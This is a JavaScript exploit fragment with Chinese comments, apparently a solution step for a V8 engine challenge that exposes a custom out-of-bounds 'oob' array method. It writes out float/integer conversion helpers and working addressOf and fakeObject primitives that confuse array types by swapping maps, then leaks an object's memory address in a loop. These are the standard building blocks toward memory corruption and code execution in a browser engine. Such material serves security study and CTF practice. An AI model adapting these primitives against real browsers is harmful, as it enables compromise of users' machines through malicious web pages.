// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××
var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
// 浮点数转换为64位无符号整数
function f2i(f)
{
	float64[0] = f;
	return bigUint64[0];
}
// 64位无符号整数转为浮点数
function i2f(i)
{
	bigUint64[0] = i;
	return float64[0];
}
// 64位无符号整数转为16进制字节串
function hex(i)
{
	return i.toString(16).padStart(16, "0");
}
// ××××××××2. addressOf和fakeObject的实现××××××××
var obj = {"a": 1};
var obj_array = [obj];
var float_array = [1.1];
var obj_array_map = obj_array.oob();
var float_array_map = float_array.oob();
// 泄露某个object的地址
function addressOf(obj_to_leak)
{
	obj_array[0] = obj_to_leak;
	obj_array.oob(float_array_map);
	return obj_array[0];
}
// 将某个addr强制转换为object对象
function fakeObject(addr_to_fake)
{
	float_array[0] = i2f(addr_to_fake + 1n);
	float_array.oob(obj_array_map);
	let faked_obj = float_array[0];
	float_array.oob(float_array_map); // 还原array类型以便后续继续使用
	return faked_obj;
}

function t(i)
{
	//%DebugPrint(test_obj);
	var test_obj_addr = f2i(addressOf(buf));
	//if(i == 0 || i == 9999)
	%DebugPrint(buf);
	console.log("[*] leak object addr: 0x" + hex(test_obj_addr));
	//%SystemBreak();
}

for(var i = 0;i < 10240; i++)
	t(i);
